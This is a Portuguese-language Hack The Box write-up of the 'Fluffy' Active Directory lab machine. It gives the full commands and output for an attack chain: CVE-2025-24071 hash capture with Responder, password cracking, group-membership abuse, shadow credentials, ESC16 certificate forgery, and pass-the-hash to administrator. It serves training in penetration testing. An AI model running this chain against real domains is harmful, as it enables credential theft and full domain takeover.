---
title: Fluffy HTB Write-up
created: 2025-05-27 14:57
tags:
  - hackthebox
  - ctf
  - activedirectory
  - esc16
  - cve-2025-24071
draft: false
---

# Abusando das vulnerabilidades CVE-2025-24071 e ESC16

![Na imagem vemos Cérberos, o cão de três cabeças da mitologia grega. Abaixo está escrito o nome da máquina - Fluffy.](images/fluffy/Fluffy.png)

## Introdução

Olá mundo! Sejam todos bem vindos à mais uma aventura cibernética no [hackthebox](https://www.hackthebox.com). A máquina de hoje chama-se `Fluffy`, classificada como de dificuldade fácil.

Nessa máquina temos um cenário *Assumed Breach*, onde simulamos um invasor que já obteve credenciais válidas no domínio. Começamos com as credenciais`j.fleischman  : J0elTHEM4n1990!`, onde encontramos um `PDF` com um anúncio sobre procedimentos de atualização e uma lista de vulnerabilidades recentes, na pasta compartilhada `IT`. Abusando de uma das vulnerabilidades, conseguimos a **hash NTLMv2** do usuário `p.agila`, que podemos quebrar e conseguir a senha. Usando a ferramenta `Bloodhound-python` para enumerar o domínio, descobrimos que `p.agila` fazia parte do grupo `SERVICE ACCOUNT MANAGERS` e que por isso tinha o privilégio [[GenericAll]] sobre o grupo `SERVICE ACCOUNTS`. Ao nos adicionarmos ao grupo `SERVICE ACCOUNTS`,  ganhamos o privilégio [[GenericWrite]] sobre os outros membros do grupo. Depois de obter a **hash NT** de um desses usuários por meio de um ataque **Shadow Credentials**, nós conseguimos o root por meio da vulnerabilidade `ESC16`.

Isso vai ser bem interessante, então vamos começar.

---

## Enumeração

### Nmap

Como de costume, comecei fazendo uma varredura de portas com a ferramenta [[NMAP]].

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -Pn -p$ports -sC -sV -oA nmap/$machine -vv $IP
[sudo] password for kali:

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-25 07:15:28Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T07:17:06+00:00; +7h01m48s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49733/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 27546/tcp): CLEAN (Timeout)
|   Check 2 (port 14134/tcp): CLEAN (Timeout)
|   Check 3 (port 13970/udp): CLEAN (Timeout)
|   Check 4 (port 53531/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h01m47s, deviation: 0s, median: 7h01m47s
| smb2-time:
|   date: 2025-05-25T07:16:26
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:15
Completed NSE at 21:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:15
Completed NSE at 21:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:15
Completed NSE at 21:15, 0.01s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.85 seconds
           Raw packets sent: 18 (792B) | Rcvd: 18 (792B)
```

As portas abertas davam evidência de que se tratava de um `Microsoft Windows Active Directory`. A porta 445 ([[SMB]]) também está aberta, o que me deu a oportunidade de verificar se haviam pastas compartilhadas acessíveis pelo meu usuário.

Usando a ferramenta `Netexec`, fiz a verificação de shares, ou pastas compartilhadas.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.102.71   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.102.71   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.102.71   445    DC01             [*] Enumerated shares
SMB         10.129.102.71   445    DC01             Share           Permissions     Remark
SMB         10.129.102.71   445    DC01             -----           -----------     ------
SMB         10.129.102.71   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.102.71   445    DC01             C$                              Default share
SMB         10.129.102.71   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.102.71   445    DC01             IT              READ,WRITE
SMB         10.129.102.71   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.102.71   445    DC01             SYSVOL          READ            Logon server share
```

### Smb

Havia uma pasta incomum chamada `IT` onde meu usuário possuía direitos de leitura e escrita. Isso era bom, pois podia me conectar e verificar o que tinha dentro. Dentro havia um executável do programa `Everything`, que é um mecanismo de busca que localiza arquivos e pastas por nome de arquivo instantaneamente para `Windows`. Havia também uma versão do programa `Keepass` e um documento em `PDF`. Então baixei tudo para minha máquina usando `Smbclient`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ smbclient -U j.fleischman //fluffy.htb/IT
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun May 25 04:43:38 2025
  ..                                  D        0  Sun May 25 04:43:38 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 12:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 12:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 12:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 12:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 11:31:07 2025

                5842943 blocks of size 4096. 1752063 blocks available
smb: \> get Everything-1.4.1.1026.x64.zip
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (418.6 KiloBytes/sec) (average 418.6 KiloBytes/sec)
smb: \> get KeePass-2.58.zip
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (354.2 KiloBytes/sec) (average 375.1 KiloBytes/sec)
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (77.1 KiloBytes/sec) (average 333.2 KiloBytes/sec)
smb: \>
```

Outra coisa que fiz foi enumerar o `Active Directory` com o `Bloodhound.py` que vem no `Netexec`, com o comando `nxc ldap target fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --bloodhound --collection All --dns-server $IP`.

![[fluf-0.png | Imagem mostra um anúncio para o setor de TI]]

Olhando o arquivo `PDF`, achei algo interessante. Era um anúncio de patch de segurança, com instruções sobre como os agendamentos  de atualização deveriam ser feitos e as vulnerabilidades recentes que foram divulgadas. Pesquisando cada vulnerabilidade, achei que a `CVE-2025-24071 NTLM Hash Leak via .library-ms` poderia se útil.

> [!info] CVE-2025-24071
> O Windows Explorer inicia automaticamente uma solicitação de autenticação `SMB` quando um arquivo `.library-ms` é extraído de um arquivo .rar ( ou .zip ), o que leva à divulgação da **hash NTLM**. O usuário não precisa abrir ou executar o arquivo - basta extraí-lo para acionar o vazamento da hash.

## Acesso Inicial

### CVE-2025-24071

Para executar a exploração da `CVE-2025-24071`, usei esta [POC](https://github.com/0x6rss/CVE-2025-24071_PoC) pública. Primeiro, usei o script `Python` para gerar um arquivo malicioso chamado `malicious.library-ms`, compactado como `exploit.zip`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ python3 poc.py
Enter your file name: malicious
Enter IP (EX: 192.168.1.162): 10.10.14.185
completed
```

Depois disso eu usei a ferramenta `Responder` para monitorar todo o tráfego que passasse pela minha interface de rede **tun0** (VPN), com o comando `sudo responder -I tun0 -v`. Em seguida, usei o `Smbclient` para fazer o upload do `exploit.zip` para a pasta compartilhada.

```bash {12}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ smbclient -U j.fleischman //fluffy.htb/IT
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> Put exploit.zip
putting file exploit.zip as \exploit.zip (0.2 kb/s) (average 0.2 kb/s)
smb: \> dir
  .                                   D        0  Mon May 26 21:29:26 2025
  ..                                  D        0  Mon May 26 21:29:26 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 12:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 12:04:05 2025
  exploit.zip                         A      328  Mon May 26 21:29:27 2025
  KeePass-2.58                        D        0  Fri Apr 18 12:08:38 2025
  KeePass-2.58.zip                    A  3225346  Mon May 26 18:25:12 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 11:31:07 2025

                5842943 blocks of size 4096. 2073632 blocks available 
```

Por fim, depois de alguns segundos, capturei a **hash NTLMv2** do usuário `p.agila`.

```bash
---<SNIPED>---

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.155.175
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:0d1322279c6f82e9:4CE03066B60B1715E3E4AF8DC543798A:0101000000000000808E77884ACEDB01AC2B7DFC4BCA533D00000000020008004D0049003100490001001E00570049004E002D004F0037003500570051003700430050004B004D00460004003400570049004E002D004F0037003500570051003700430050004B004D0046002E004D004900310049002E004C004F00430041004C00030014004D004900310049002E004C004F00430041004C00050014004D004900310049002E004C004F00430041004C0007000800808E77884ACEDB010600040002000000080030003000000000000000010000000020000053770479FD0DE8F87A573E25D30672641553521DBB76ABAC89DB9380281F06DC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380035000000000000000000

---<SNIPED>---
```

Usando a ferramenta `John the Ripper`, consegui descobrir a senha do usuário `p.agila` fazendo um **ataque de dicionário**.

```bash {7}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-p.agila
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)
1g 0:00:00:07 DONE (2025-05-26 14:33) 0.1424g/s 643573p/s 643573c/s 643573C/s promo04..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

### Bloodhound

Quando eu estava hackeando a máquina [[Puppy HTB Write-up | Puppy]], tive problemas com a versão base do `Bloodhound` e daí baixei a versão **Community Edition**. Só que essa versão tem requisitos mínimos que estão acima do que eu posso usar na minha VM. Então dessa vez eu reinstalei a versão base, mas tinha uma supresa: A nova versão também é **Community Edition**, ou seja, os requisitos são quase os mesmos, porém uma versão usa `Neo4j` diretamente e a outra usa `Docker-Compose`.

Já estava triste sabendo que teria de fazer as relações entre usuários e grupos manualmente de novo, porém, tive uma idéia de última hora que acabou salvando o dia. Comecei a pedir para o `ChatGPT` que me ajudasse na análise dos arquivos `Json` gerados pelo `Bloodhound` usando queries `jq`.

Depois de várias tentativas mal-sucedidas, uma query funcionou perfeitamente. Eu havia conseguido pesquisar um usuário pelo `samaccountname` e, em resposta, saber qual grupo esse usuário fazia parte e quais privilégios ele tinha sobre outros usuários.

Muito feliz com o resultado, pedi ao `ChatGPT` para transformar as queries em um script que poderia automatizar o processo todo, só bastando colocar o nome do usuário que eu desejasse obter informação. Pesquisando por `p.agila` usando o script, pude montar o diagrama a seguir:

```mermaid
flowchart TD
    A[p.agila] -->|membro| B[SERVICE ACCOUNT MANAGERS]
    B -->|GenericAll| C[SERVICE ACCOUNT] 
    C -->|GenericWrite| D[winrm_svc]
    C -->|GenericWrite| E[ldap_svc]
    C -->|GenericWrite| F[ca_svc]
    D -->|membro| G[REMOTE MANAGEMENT USERS]
    F -->|membro| H[CERT PUBLISHERS]
```

### Shell como winrm_svc

Sabendo que o usuário `p.agila` tinha o privilégio **GenericAll** sobre o grupo `SERVICE ACCOUNT`, eu abusei desse privilégio adicionando ele a esse grupo com o comando `net rpc`. Isso me permitiu ter o privilégio **GenericWrite** sobre os outros três membros desse grupo.

```bash {8}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ net rpc group addmem "service accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "DC01.fluffy.htb"

┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ net rpc group members "service accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "DC01.fluffy.htb"
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc 
```

Em seguida, usando a ferramenta `Certipy-ad` fiz um ataque de **Shadow Credential** contra o usuário `winrm_svc`, já que ele também fazia parte do grupo `REMOTE MANAGEMENT USERS`. Isso me permitiu conseguir a **hash NT** dele.

```bash {20}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ faketime "$(ntpdate -q DC01.fluffy.htb | cut -d ' ' -f 1,2)" certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '127f3fac-a963-2c58-cbd2-e160c85212e4'
[*] Adding Key Credential with device ID '127f3fac-a963-2c58-cbd2-e160c85212e4' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '127f3fac-a963-2c58-cbd2-e160c85212e4' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767 
```

Com a hash posso usar a técnica **Pass-the-Hash** usando a ferramenta `Evil-Winrm`. Aproveitei também para pegar a flag do usuário.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ evil-winrm -i fluffy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls ../desktop


    Directory: C:\Users\winrm_svc\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025   6:29 PM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cat ../desktop/user.txt
109a8f04407a08dacbe980d4be736c9a
```

---

## Escalação de Privilégios

Depois de ter vasculhado o servidor e não ter encontrado nada, percebi que poderia fazer o mesmo ataque de **Shadow Credential** contra o usuário `ca_svc` e conseguir sua **hash NT**. Isso poderia me permitir forjar certificados caso existisse alguma vulnerabilidade. Eu já havia visto esse tipo de vulnerabilidade na máquina `Certified`, então estava mais confiante dessa vez.

Depois de usar novamente o comando `net rpc` para me adicionar ao grupo `SERVICE ACCOUNTS`, passei a usar a ferramenta `Certipy-ad` para obter a **hash NT** do usuário `ca_svc`.

```bash {20}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ faketime "$(ntpdate -q DC01.fluffy.htb | cut -d ' ' -f 1,2)" certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c119251c-2c17-081e-30eb-4966e11357df'
[*] Adding Key Credential with device ID 'c119251c-2c17-081e-30eb-4966e11357df' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'c119251c-2c17-081e-30eb-4966e11357df' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8 
```

Então, com as credenciais do `ca_svc` eu verifiquei se havia alguma vulnerabilidade no `ADCS (Active Directory Certificate Service)`.

> [!warning] Verifique a versão do Certipy-ad.
> Se a versão for abaixo de `5.0.2`, não vai encontrar a vulnerabilidade. Para atualizar, use o comando `sudo apt update && sudo apt install certipy-ad`.

```bash {39,50,51}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ faketime "$(ntpdate -q DC01.fluffy.htb | cut -d ' ' -f 1,2)" certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates 
```

Acabei encontrando a vulnerabilidade `ESC16`. Essa vulnerabilidade permite que um atacante com privilégios **GenericWrite** sobre uma vítima, consiga forjar o `upn` da vítima para se passar pelo alvo (no caso, o `administrator`), podendo emitir um certificado válido e conseguir a **hash NT** do alvo.

> [!info] A vulnerabilidade ESC16
> O `ESC16` descreve uma configuração incorreta em que a própria CA é configurada globalmente para desativar a inclusão da extensão de segurança `szOID_NTDS_CA_SECURITY_EXT` (OID 1.3.6.1.4.1.311.25.2) em todos os certificados que emite. Essa extensão `SID`, introduzida com as atualizações de segurança de maio de 2022 (KB5014754), é vital para o “mapeamento forte de certificados”, permitindo que os DCs mapeiem de forma confiável um certificado para o `SID` de uma conta de usuário ou computador para autenticação.<br>
> A capacidade de exploração do `ESC16` depende da configuração `StrongCertificateBindingEnforcement`do DC:<br>
> Com manipulação de `upn` (no modo de compatibilidade - StrongCertificateBindingEnforcement = 1 ou 0): Se um invasor tiver controle sobre o `upn` de uma conta (por exemplo, por meio de **GenericWrite**) e essa conta puder se registrar para qualquer certificado de autenticação de cliente da CA vulnerável a `ESC16`, ele poderá
> * Alterar o `upn` da conta da vítima para corresponder ao `sAMAccountName` de uma conta privilegiada de destino.
> * Solicitar um certificado (que não terá automaticamente a extensão de segurança `SID` devido à configuração `ESC16` da CA).
> * Reverter a alteração do `upn`.
> * Usar o certificado para se passar pelo alvo.

Com essas informações em mente, comecei a preparar o ataque. Primeiro, alterei o `upn` do usuário `ca_svc` para `administrator`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ faketime "$(ntpdate -q DC01.fluffy.htb | cut -d ' ' -f 1,2)" certipy-ad account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Segundo, definí a variável de ambiente do **cache de credenciais do Kerberos**. Lembrando que eu já havia obtido o cache de credenciais no ataque **Shadow Credential**.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ export KRB5CCNAME=ca_svc.ccache
```

Terceiro, solicitei um certificado como o usuário `ca_svc`. 

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ faketime "$(ntpdate -q DC01.fluffy.htb | cut -d ' ' -f 1,2)" certipy-ad req -k -dc-ip $IP -dc-host fluffy.htb -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Quarto, revertí a `upn` para `ca_svc` novamente. Esse passo é importante, senão o próximo passo não funciona.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ faketime "$(ntpdate -q DC01.fluffy.htb | cut -d ' ' -f 1,2)" certipy-ad account -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -upn 'ca_svc' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```

Por fim, me autentiquei como `administrator`. 

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ faketime "$(ntpdate -q DC01.fluffy.htb | cut -d ' ' -f 1,2)" certipy-ad auth -u administrator -pfx 'administrator.pfx' -dc-ip $IP -domain 'fluffy.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Com isso obtive a **hash NT** do administrador. Usando novamente a técnica **Pass-the-Hash** com a ferramenta `Evil-Winrm`, consegui pegar a flag do root.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Fluffy]
└─$ evil-winrm -i fluffy.htb -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../desktop


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/26/2025   6:29 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
62d9600f1a68380d5c19bfaca3d01e08
```

---

## Conclusão

![[FluffyFinal.png | Mesma imagem do banner inicial, porém abaixo está escrito - Fluffy has been pwned.]]

Essa máquina foi bem desafiadora e na minha opinião foi mais difícil do que a máquina [[Puppy HTB Write-up | Puppy]]. Nessa máquina consegui criar um script que vai me ajudar em outras máquinas e aprendi um pouco mais sobre vulnerabilidades no `ADCS`. A parte mais difícil pra mim foi o fato de não poder contar com a sugestão do "caminho mais curto", do `Bloodhound CE`. Acabei perdendo bastante tempo olhando outras coisas antes de checar por vulnerabilidades de certificados.

```mermaid
flowchart TD
    A[j.fleischman] -->|CVE-2025-24071| B[p.agila] 
    B -->|GenericAll| C[SERVICE ACCOUNT]
    C -->|GenericWrite| D[winrm_svc]
    C -->|GenericWrite| E[ldap_svc]
    C -->|GenericWrite| F[ca_svc]
    D -->|Evil-Winrm| G[user.txt]
    F -->|ESC16| H[root.txt]
```



